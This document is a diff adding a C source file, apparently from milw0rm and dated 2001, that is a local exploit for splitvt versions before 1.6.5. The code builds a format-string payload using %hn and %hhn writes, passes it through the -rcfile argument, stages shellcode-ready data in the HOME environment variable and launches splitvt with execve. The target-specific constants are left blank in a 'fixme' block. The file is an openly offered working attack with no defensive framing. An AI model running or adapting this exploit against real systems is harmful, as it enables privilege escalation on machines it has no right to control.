@@ -1,0 +1,292 @@
+/*
+ * MasterSecuritY <www.mastersecurity.fr>
+ *
+ * spitvt.c - Local exploit for splitvt < 1.6.5
+ * Copyright (C) 2001  fish stiqz <fish@analog.org>
+ * Copyright (C) 2001  Michel "MaXX" Kaempf <maxx@mastersecurity.fr>
+ *
+ * Updated versions of this exploit and the corresponding advisory will
+ * be made available at:
+ *
+ * ftp://maxx.via.ecp.fr/spitvt/
+ *
+ * This program is free software; you can redistribute it and/or modify
+ * it under the terms of the GNU General Public License as published by
+ * the Free Software Foundation; either version 2 of the License, or (at
+ * your option) any later version.
+ *
+ * This program is distributed in the hope that it will be useful,
+ * but WITHOUT ANY WARRANTY; without even the implied warranty of
+ * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the GNU
+ * General Public License for more details.
+ *
+ * You should have received a copy of the GNU General Public License
+ * along with this program; if not, write to the Free Software
+ * Foundation, Inc., 59 Temple Place, Suite 330, Boston, MA 02111-1307
+ * USA
+ */
+
+#include <limits.h>
+#include <stdint.h>
+#include <stdlib.h>
+#include <string.h>
+#include <unistd.h>
+
+/* array_of_strings_t */
+typedef struct array_of_strings_s {
+    size_t strings;
+    char ** array;
+} array_of_strings_t;
+
+/* type_t */
+typedef enum {
+    short_int,
+    signed_char,
+    null
+} type_t;
+
+/* n_t */
+typedef struct n_s {
+    type_t type;
+    void * pointer;
+    int number;
+} n_t;
+
+/* <fixme> */
+#define COMMAND ""
+#define HOME_VALUE ""
+#define SPLITVT ""
+#define STACK ()
+n_t n[] = {
+    { null }
+};
+/* </fixme> */
+
+unsigned long int eat;
+array_of_strings_t aos_envp = { 0, NULL };
+array_of_strings_t aos_argv = { 0, NULL };
+
+/* array_of_strings() */
+int array_of_strings( array_of_strings_t * p_aos, char * string )
+{
+    size_t strings;
+    char ** array;
+
+    if ( p_aos->strings == SIZE_MAX / sizeof(char *) ) {
+        return( -1 );
+    }
+    strings = p_aos->strings + 1;
+
+    array = realloc( p_aos->array, strings * sizeof(char *) );
+    if ( array == NULL ) {
+        return( -1 );
+    }
+
+    (p_aos->array = array)[ p_aos->strings++ ] = string;
+    return( 0 );
+}
+
+#define HOME_KEY "HOME"
+/* home() */
+int home()
+{
+    char * home;
+    unsigned int envp_home;
+    unsigned int i;
+
+    home = malloc( sizeof(HOME_KEY) + sizeof(HOME_VALUE) + (4-1) );
+    if ( home == NULL ) {
+        return( -1 );
+    }
+
+    strcpy( home, HOME_KEY"="HOME_VALUE );
+
+    /* if HOME_VALUE holds a shellcode and is to be executed, 4 bytes
+     * alignment is sometimes required (on sparc architectures for
+     * example) */
+    envp_home = STACK - sizeof(SPLITVT) - sizeof(HOME_VALUE);
+    for ( i = 0; i < envp_home % 4; i++ ) {
+        strcat( home, "X" );
+    }
+
+    return( array_of_strings(&aos_envp, home) );
+}
+
+/* shell() */
+int shell()
+{
+    size_t size;
+    unsigned int i;
+    char * shell;
+    char * string;
+
+    size = 0;
+    for ( i = 0; n[i].type != null; i++ ) {
+        size += sizeof(void *);
+    }
+
+    shell = malloc( size + 3 + 1 );
+    if ( shell == NULL ) {
+        return( -1 );
+    }
+
+    for ( i = 0; n[i].type != null; i++ ) {
+        *( (void **)shell + i ) = n[i].pointer;
+    }
+
+    /* since file is 16 bytes aligned on the stack, the following 3
+     * characters padding ensures shell is 4 bytes aligned */
+    for ( i = 0; i < 3; i++ ) {
+        shell[ size + i ] = 'X';
+    }
+
+    shell[ size + i ] = '\0';
+
+    for ( string = shell; string <= shell+size+i; string += strlen(string)+1 ) {
+        if ( array_of_strings(&aos_argv, string) ) {
+            return( -1 );
+        }
+    }
+
+    return( 0 );
+}
+
+#define S "%s"
+#define C "%c"
+#define HN "%hn"
+#define HHN "%hhn"
+/* file() */
+int file()
+{
+    size_t size;
+    unsigned int i, j;
+    char * file;
+    int number;
+    unsigned int argv_file;
+
+    size = (sizeof(S)-1) + (eat * (sizeof(C)-1));
+    for ( i = 0; n[i].type != null; i++ ) {
+        switch ( n[i].type ) {
+            case short_int:
+                /* at most USHRT_MAX 'X's are needed */
+                size += USHRT_MAX + (sizeof(HN)-1);
+                break;
+
+            case signed_char:
+                /* at most UCHAR_MAX 'X's are needed */
+                size += UCHAR_MAX + (sizeof(HHN)-1);
+                break;
+
+            case null:
+            default:
+                return( -1 );
+        }
+    }
+
+    file = malloc( size + (16-1) + 1 );
+    if ( file == NULL ) {
+        return( -1 );
+    }
+
+    i = 0;
+
+    memcpy( file + i, S, sizeof(S)-1 );
+    i += sizeof(S)-1;
+
+    for ( j = 0; j < eat; j++ ) {
+        memcpy( file + i, C, sizeof(C)-1 );
+        i += sizeof(C)-1;
+    }
+
+    /* initialize number to the number of characters written so far
+     * (aos_envp.array[aos_envp.strings-2] corresponds to the HOME
+     * environment variable) */
+    number = strlen(aos_envp.array[aos_envp.strings-2])-sizeof(HOME_KEY) + eat;
+
+    for ( j = 0; n[j].type != null; j++ ) {
+        switch ( n[j].type ) {
+            case short_int:
+                while ( (short int)number != (short int)n[j].number ) {
+                    file[ i++ ] = 'X';
+                    number += 1;
+                }
+                memcpy( file + i, HN, sizeof(HN)-1 );
+                i += sizeof(HN)-1;
+                break;
+
+            case signed_char:
+                while ( (signed char)number != (signed char)n[j].number ) {
+                    file[ i++ ] = 'X';
+                    number += 1;
+                }
+                memcpy( file + i, HHN, sizeof(HHN)-1 );
+                i += sizeof(HHN)-1;
+                break;
+
+            case null:
+            default:
+                return( -1 );
+        }
+    }
+
+    /* in order to maintain a constant distance between the sprintf()
+     * arguments and the splitvt shell argument, 16 bytes alignment is
+     * sometimes required (for ELF binaries for example) */
+    argv_file = STACK - sizeof(SPLITVT);
+    for ( j = 0; aos_envp.array[j] != NULL; j++ ) {
+        argv_file -= strlen( aos_envp.array[j] ) + 1;
+    }
+    argv_file -= i + 1;
+    for ( j = 0; j < argv_file % 16; j++ ) {
+        file[ i++ ] = 'X';
+    }
+
+    file[ i ] = '\0';
+
+    return( array_of_strings(&aos_argv, file) );
+}
+
+/* main() */
+int main( int argc, char * argv[] )
+{
+    /* eat */
+    if ( argc != 2 ) {
+        return( -1 );
+    }
+    eat = strtoul( argv[1], NULL, 0 );
+
+    /* aos_envp */
+    array_of_strings( &aos_envp, "TERM=vt100" );
+    /* home() should always be called right before NULL is added to
+     * aos_envp */
+    if ( home() ) {
+        return( -1 );
+    }
+    array_of_strings( &aos_envp, NULL );
+
+    /* aos_argv */
+    array_of_strings( &aos_argv, SPLITVT );
+    array_of_strings( &aos_argv, "-upper" );
+    array_of_strings( &aos_argv, COMMAND );
+    array_of_strings( &aos_argv, "-lower" );
+    array_of_strings( &aos_argv, COMMAND );
+    /* shell() should always be called right before "-rcfile" is added
+     * to aos_argv */
+    if ( shell() ) {
+        return( -1 );
+    }
+    array_of_strings( &aos_argv, "-rcfile" );
+    /* file() should always be called right after "-rcfile" is added to
+     * aos_argv and right before NULL is added to aos_argv */
+    if ( file() ) {
+        return( -1 );
+    }
+    array_of_strings( &aos_argv, NULL );
+
+    /* execve() */
+    execve( aos_argv.array[0], aos_argv.array, aos_envp.array );
+    return( -1 );
+}
+
+
+// milw0rm.com [2001-01-26]
